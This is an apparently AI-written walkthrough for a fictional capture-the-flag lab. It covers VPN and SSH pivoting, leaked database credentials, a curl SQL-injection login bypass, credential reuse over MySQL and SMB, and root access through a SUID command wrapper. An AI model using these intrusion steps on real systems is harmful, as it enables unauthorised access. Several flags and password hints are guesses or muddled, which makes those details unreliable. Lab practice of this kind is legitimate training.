Okay, here is a beginner-friendly walkthrough for the GhostFrame CTF, assuming the `setup_ghostframe_environment.sh` script has been successfully run on a dedicated Kali Linux VM.

**GhostFrame CTF - Beginner Walkthrough**

**Mission Briefing:**

Welcome, operative. You are stepping into the digital shoes of "0xGhost," an agent working for the shadowy Nu11Division collective. Ghost was tasked with infiltrating TargetCorp to investigate "Project Griffin," a suspected advanced AI project. Ghost has gone dark. Your mission is to retrace Ghost's steps using their compromised Kali machine, recover their findings, uncover the truth about Project Griffin, and report back to Nu11Division command (represented by "Zer0Frame" or "ZF").

**Prerequisites:**

1.  **A Dedicated Kali Linux VM:** You **MUST** run the setup script on a Virtual Machine you don't mind resetting. The script makes significant changes. **DO NOT RUN THIS ON YOUR MAIN MACHINE.**
2.  **Setup Script Executed:** You have already run `sudo ./setup_ghostframe_environment.sh` successfully on the Kali VM.
3.  **Basic Linux Familiarity:** Knowing commands like `ls`, `cd`, `cat`, `grep` will be helpful. We'll explain others as we go.

**Let's Begin!**

---

**Phase 1: Logging In and Initial Recon (Ghost's Machine)**

1.  **Log in as Ghost:**
    *   After the setup script finishes, log out of your current Kali user (e.g., `kali`).
    *   Log back in using the username: `ghost`
    *   The password (found in the setup script) is: `password123`
    *   You are now using Ghost's configured desktop environment.

2.  **Open a Terminal:** Find the terminal application and open it. This is where you'll type commands.

3.  **Explore Ghost's Home Directory:** This is your primary starting point. Ghost left notes, tools, and clues here.
    *   Type `ls -la` to see all files and directories (including hidden ones starting with `.`).
    *   Type `tree` (if installed, otherwise `ls -R`) to get a visual overview. Pay attention to directories like `Documents`, `Notes`, `Downloads`, `.ssh`, `Mail`, `Pictures`.

4.  **Find the Starting Instructions:** Ghost received instructions from ZF.
    *   Navigate to the Notes directory: `cd ~/Notes`
    *   List files: `ls`
    *   Read the crucial file: `cat README_ZF_CONTACT.txt`
    *   **Key Info:** This file tells you:
        *   How to submit flags: `nc director 9999` (You can also use the IP: `nc 192.168.200.2 9999`)
        *   The *real* first flag from ZF: `FLAG{ZEROFRAME_INSTRUCTIONS_RECEIVED}`
        *   Another flag mentioned in Ghost's main notes: `FLAG{MAIN_STRATEGY_DOCUMENT_LOCATED}`
        *   Hints about VPN (`~/player-ghostframe.ovpn`) and the encrypted key (`~/.ssh/id_rsa_ghost_encrypted`).

5.  **Submit Your First Flags:** Let ZF know you're online.
    *   `nc director 9999`
    *   Type `FLAG{ZEROFRAME_INSTRUCTIONS_RECEIVED}` and press Enter. You should get "VALID FLAG ACCEPTED".
    *   Connect again: `nc director 9999`
    *   Type `FLAG{MAIN_STRATEGY_DOCUMENT_LOCATED}` and press Enter. Accepted again!

6.  **Examine Ghost's Main Strategy:** This is the treasure map!
    *   `cd ~/Documents/research/project_chimera/notes/`
    *   `cat main_strategy.md`
    *   **Critical Hints Found:**
        *   Target IP addresses and hostnames (like `172.16.10.5` for the jump box).
        *   Password hint for the encrypted SSH key (`id_rsa_ghost_encrypted`): "That Keanu Reeves cyberpunk movie... the year it released?". Think: Ghost in the Shell (movie, not anime release year) -> `GhostInTheShell2077`.
        *   Password hint for the encrypted Zip file (`chimera_backup.zip`): "Project name screamed out loud!" -> `ProjectChimera!`.
        *   Password for KeePass DB (`ghost_secrets.kdbx`): `ChangeMe123!`.
        *   Password for the Stego image (`sky.png`): `steganography`.
        *   The `ghost` user's weak password (used elsewhere): `password123`.

7.  **Explore Other Initial Clues (Optional but Recommended):**
    *   `cat ~/Notes/personal/reminders.txt` (Mentions Canary contact, Stego password again).
    *   `cat ~/Mail/inbox/msg_from_ZF_01.eml` (URGENT Canary details: `anonymous_canary@protonmail.com`, protocol `DeltaCharlie`. Flag: `FLAG{CANARY_CONTACT_DETAILS_RECEIVED}`). Submit this flag!
    *   `ls -la ~/Notes` (Notice the file with a space: `. hidden config `). `cat ~/Notes/. hidden\ config\ ` (Flag: `FLAG{FOUND_HIDDEN_SPACED_FILE}`). Submit it!
    *   `cat ~/.config/some_app/config.ini` (Look for commented-out line with Base64). Copy the long string. Decode it: `echo <paste_base64_string_here> | base64 -d`. (Flag: `FLAG{BASE64_HIDDEN_IN_CONFIG}`). Submit it!
    *   Check Trash: `cat ~/.local/share/Trash/files/Nul1Div_comms_leak_analysis.txt` (More Canary context).
    *   Pictures: `ls ~/Pictures`. Note `sky.png`. Use the password from notes: `steghide extract -sf ~/Pictures/sky.png -p steganography`. A file `secret.txt` appears. `cat secret.txt`. (Flag: `FLAG{STEGO_SKY_IS_BLUE_...}`). Submit it!
    *   Downloads: `ls ~/Downloads`. Note `chimera_backup.zip`. Unzip it: `unzip -P ProjectChimera! ~/Downloads/chimera_backup.zip`. Explore the extracted files.
    *   KeePass: `ls ~/Documents`. Note `ghost_secrets.kdbx.txt`. It tells you to use KeePassXC (install if needed: `sudo apt update && sudo apt install keepassxc`) to create a *real* DB with the password `ChangeMe123!` and add the placeholder entries. The flag is right in the text file: `FLAG{ACCESSED_KEEPASS_PLACEHOLDER}`. Submit it!

---

**Phase 2: Connecting to the Target Network (VPN)**

1.  **Locate VPN Files:**
    *   The real config file is in Ghost's home: `~/player-ghostframe.ovpn`
    *   The required key is: `~/.ssh/id_rsa_ghost_encrypted`

2.  **Get the Key Password:** From `main_strategy.md`, the password is `GhostInTheShell2077`.

3.  **Connect to the VPN:** OpenVPN needs root privileges.
    *   `sudo openvpn --config ~/player-ghostframe.ovpn`
    *   Enter `password123` when prompted for Ghost's sudo password.
    *   When prompted for the "Private Key Password", enter: `GhostInTheShell2077`
    *   Wait for "Initialization Sequence Completed". **Keep this terminal open!**

4.  **Verify Connection:** Open a *new* terminal tab or window.
    *   Type `ip a`
    *   Look for a new interface, likely `tun0`. It should have an IP address starting with `192.168.255.x`. You are now connected to the target network!

---

**Phase 3: Initial Foothold (SSH Jump Box)**

1.  **Identify the Target:** From `main_strategy.md` or `~/.ssh/config`, the jump box is `172.16.10.5` (or alias `target_internal`).

2.  **Find the Right Key:** The notes mention the `ghost` account uses the `id_ed25519` key. This key doesn't have a password.
    *   Check key exists: `ls ~/.ssh/id_ed25519`

3.  **Connect via SSH:**
    *   `ssh ghost@172.16.10.5` (Or `ssh target_internal`)
    *   If asked "Are you sure you want to continue connecting (yes/no/[fingerprint])?", type `yes` and press Enter.
    *   You should now have a command prompt on the `ssh-jump` machine!

4.  **Explore the Jump Box:**
    *   You are in `/home/ghost`. Type `ls -la`.
    *   Find the flag: `cat flag.txt` (Flag: `FLAG{JUMPBOX_ACCESS_GHOST}`). **Go back to your Kali machine terminal (not the SSH one) and submit this flag:** `nc director 9999`.
    *   Check for messages from ZF: `ls messages/`. Initially empty.
    *   Check scripts: `ls scripts/`. `cat scripts/check_connections.sh`.

---

**Phase 4: Exploring the DMZ (Web & Portal)**

*   **Perform these steps from your SSH session on the `ssh-jump` box.**

1.  **Target 1: Web Server (172.16.10.100)**
    *   Check what's running: `curl http://172.16.10.100` (Basic welcome page).
    *   Check `robots.txt`: `curl http://172.16.10.100/robots.txt`. It disallows `/dev-backup/`. Interesting!
    *   Explore the backup directory: `curl http://172.16.10.100/dev-backup/` (Might show file listing or error).
    *   Try finding specific files: `curl http://172.16.10.100/dev-backup/db_config.php.bak`
    *   **Credentials Leaked!** You'll see PHP code defining DB user `web_user` and password `SimplePassw0rd`. Make a note of these!
    *   **Find Flag:** Check the web server's root directory or flag file. The setup script placed a flag file inside the container, accessible via the mount point, but it's easier to assume the flag is related to finding the creds. The intended flag here is likely `FLAG{WEBSERVER_DB_CREDS_LEAKED}`. Submit it from your Kali machine.

2.  **Target 2: Portal Server (172.16.10.105)**
    *   Access the portal: `curl http://172.16.10.105`
    *   View source code (or use `curl` output). Look for comments or hidden info.
        *   **Minor Flag:** The setup script mentions `FLAG{PORTAL_HTML_SOURCE_VIEW}` might be in the source. Submit it if you find it.
    *   **Look for Vulnerabilities:** Ghost's notes mentioned potential SQL Injection (SQLi). The login page is the likely target.
    *   **Attempt SQL Injection:** A common basic SQLi bypass for login is using `' OR '1'='1 -- ` in the username field.
        *   Try with `curl`: `curl -X POST -d "username=' OR '1'='1 -- &password=anypassword" http://172.16.10.105/index.php` (You might need to adjust the parameter names if they are different, check the HTML source for the form).
    *   If successful, the response should indicate login success or show a dashboard page.
    *   **Find Flag:** The page loaded after the successful SQLi should contain the flag `FLAG{PORTAL_ACCESS_VIA_SQLI}`. Submit it.

---

**Phase 5: Pivoting to Internal Network 1 (DB, Files, Wiki)**

*   **Perform these steps from your SSH session on the `ssh-jump` box.** The jump box has access to the `10.0.10.0/24` network.

1.  **Target 1: Database Server (10.0.10.200)**
    *   Use the credentials found earlier: `web_user` / `SimplePassw0rd`.
    *   Connect to MySQL: `mysql -h 10.0.10.200 -u web_user -p`
    *   Enter password `SimplePassw0rd` when prompted.
    *   **Explore the Database:**
        *   `SHOW DATABASES;`
        *   `USE targetcorp_db;`
        *   `SHOW TABLES;` (You'll see `portal_users`, `projects`, `ghost_activity_log`, `internal_flags`).
        *   `SELECT * FROM internal_flags;` -> **Find Flag:** `FLAG{DB_ACCESS_PROJECT_GRIFFIN_MENTIONED}`. Submit it!
        *   `SELECT * FROM projects;` -> Note the description for "Project Griffin" mentioning the Dev Wiki IP (`10.0.10.150`) and restricted access.
        *   `exit` to leave MySQL.

2.  **Target 2: Fileserver (10.0.10.50)**
    *   Protocol is SMB (Windows File Sharing). Use `smbclient`.
    *   List available shares: `smbclient -L //10.0.10.50 -U ghost`
    *   Enter password `password123` (Ghost's weak password, mentioned in notes).
    *   You should see shares like `Public`, `HR_Shared`, `ghost_data`.
    *   Connect to Ghost's share: `smbclient //10.0.10.50/ghost_data -U ghost`
    *   Enter password `password123` again. You'll get an `smb: \>` prompt.
    *   **Explore the Share:**
        *   `ls` to list files. You should see `research_fragment.txt`.
        *   `get research_fragment.txt` to download it to your current directory on the jump box.
        *   `exit` smbclient.
        *   `cat research_fragment.txt`
        *   **Credentials and Flag:** The file contains credentials for the Dev Wiki (`dev_user` / `WikiPa55!`) and the flag: `FLAG{FILESERV_ACCESS_DEVWIKI_CREDS}`. Submit it!

3.  **Target 3: Dev Wiki (10.0.10.150)**
    *   Use the credentials found: `dev_user` / `WikiPa55!`.
    *   Access the wiki (usually HTTP): `curl http://10.0.10.150` (The setup uses a simple PHP setup, not a full wiki login usually, so browsing might be direct file access or simple links).
    *   **Explore Wiki Content:** Look for links or guess filenames based on DB info (Project Griffin, Deployment).
        *   Try accessing the pages directly (based on filenames in the `dev_wiki_data/html/data/pages` volume):
            *   `curl http://10.0.10.150/data/pages/project_griffin.txt` -> **Find Flag:** `FLAG{WIKI_ACCESS_GRIFFIN_DETAILS}`. Submit it! Note the mention of `qec-sim.targetcorp.internal` (`10.0.50.50`) and the [[deployment_procedures]] link.
            *   `curl http://10.0.10.150/data/pages/deployment_procedures.txt` -> **Critical Info and Flag:** This page contains:
                *   The SSH private key for user `svc_deploy` needed to access QEC Sim.
                *   The flag: `FLAG{SVC_DEPLOY_SSH_KEY_FOUND}`. **SUBMIT THIS FLAG NOW!**

---

**Phase 6: Accessing the High Security Zone (HSZ)**

1.  **Triggering the Firewall:** Submitting `FLAG{SVC_DEPLOY_SSH_KEY_FOUND}` instructed the Director container to modify the network, allowing your jump box (`ssh-jump`) to reach the HSZ network (`10.0.50.0/24`).

2.  **Confirmation (Back on Jump Box):**
    *   Check the messages directory: `cat ~/messages/zf_msg_03.txt`
    *   You should see a message from ZF confirming the firewall pinhole is open to `qec-sim` (`10.0.50.50`).

3.  **Prepare the SSH Key:**
    *   Go back to the wiki deployment page output (`curl http://10.0.10.150/data/pages/deployment_procedures.txt`).
    *   **Carefully copy** the entire SSH private key block, including the `-----BEGIN RSA PRIVATE KEY-----` and `-----END RSA PRIVATE KEY-----` lines.
    *   On the jump box, save this key to a file:
        *   `nano svc_deploy.key` (or use `vim`)
        *   Paste the key into the editor.
        *   Save and exit (Ctrl+X, then Y, then Enter in `nano`).
    *   **Set Correct Permissions:** SSH keys require strict permissions.
        *   `chmod 600 svc_deploy.key`

4.  **Connect to QEC Sim:**
    *   Use the key, user `svc_deploy`, and the IP `10.0.50.50`.
    *   `ssh -i svc_deploy.key svc_deploy@10.0.50.50`
    *   You should now be logged into the `qec-sim` machine as the `svc_deploy` user!

---

**Phase 7: Privilege Escalation and Final Payload (QEC Sim)**

*   **Perform these steps from your SSH session on the `qec-sim` box.**

1.  **Explore as `svc_deploy`:**
    *   Type `id`. You are a normal user.
    *   Look for unusual programs, especially ones with special permissions. Check common binary locations.
    *   `ls -l /usr/local/bin`
    *   **SUID Binary Found:** Notice `/usr/local/bin/qec_control`. Check permissions: `ls -l /usr/local/bin/qec_control`. The `s` in `-rwsr-xr-x` means it runs with the owner's permissions (which is `root`). This is a potential privilege escalation vector!

2.  **Analyze the SUID Binary:**
    *   Run it: `/usr/local/bin/qec_control` (Shows usage).
    *   Try running `id` through it: `/usr/local/bin/qec_control id`. The output shows `euid=0(root)`. Success! You can run commands as root via this program.

3.  **Read Root Files:** Now that you can execute commands as root, read the warning note Ghost mentioned.
    *   `/usr/local/bin/qec_control "cat /root/ghost_warning.txt"` (Use quotes if the command has spaces or special characters).
    *   **Warning and Flag:** The note warns Ghost is compromised, gives the location of the final package (`/opt/qec/payload/final_package.enc`), reveals the decryption key (`DeltaCharlie`), and contains the flag: `FLAG{QEC_ROOT_ACCESS_GHOST_WARNING}`. Submit this flag!

4.  **Find the Payload Flag:** The setup script places another flag here.
    *   Look in the mounted flag directory (check compose file for path if unsure, likely `/flags_internal`): `/usr/local/bin/qec_control "ls /flags_internal"`
    *   `/usr/local/bin/qec_control "cat /flags_internal/flag_payload.txt"` -> **Find Flag:** `FLAG{FINAL_PAYLOAD_PACKAGE_FOUND}`. Submit it!

5.  **Retrieve and Decrypt the Final Package:**
    *   Use the SUID binary to display the encrypted package content:
        *   `/usr/local/bin/qec_control "cat /opt/qec/payload/final_package.enc"`
    *   This will print binary garbage to your terminal. **Carefully select and copy ALL of the output.**
    *   **Go back to your main Kali machine terminal (where you have `openssl`).**
    *   Save the copied content to a file:
        *   `nano final_package.enc`
        *   Paste the copied content.
        *   Save and exit.
    *   **Decrypt using OpenSSL and the key from the root note (`DeltaCharlie`):**
        *   `openssl enc -aes-256-cbc -pbkdf2 -d -in final_package.enc -k DeltaCharlie`
    *   The decrypted text will print to your terminal. Read it!

6.  **Find the Final Flag:** The decrypted text contains Ghost's final report and the ultimate flag: `FLAG{PROJECT_GRIFFIN_UNCOVERED_AI_DANGER}`.

7.  **Submit the Final Flag:**
    *   `nc director 9999`
    *   Enter `FLAG{PROJECT_GRIFFIN_UNCOVERED_AI_DANGER}`.

---

**Phase 8: Debriefing**

1.  **Check Messages on Jump Box:** Go back to your SSH session on the `ssh-jump` box (it should still be running unless disconnected).
    *   Submitting the final flag triggers the Director to drop a final message.
    *   `cat ~/messages/zer0frame_final.txt`
    *   Read the debriefing message from Zer0Frame.

**Congratulations! You have successfully completed the GhostFrame CTF!** You retraced Ghost's steps, uncovered the dangerous truth about Project Griffin, and reported back to Nu11Division.

**Cleanup (Optional):**

*   On your Kali VM, go back to the setup directory (`/opt/ghostframe_ctf` by default).
*   Stop the Docker containers: `sudo docker-compose down`
*   Stop and remove data volumes: `sudo docker-compose down -v`
*   Disconnect the VPN (Ctrl+C in the OpenVPN terminal).
*   Log out as `ghost`.
*   You can now reset or delete your Kali VM.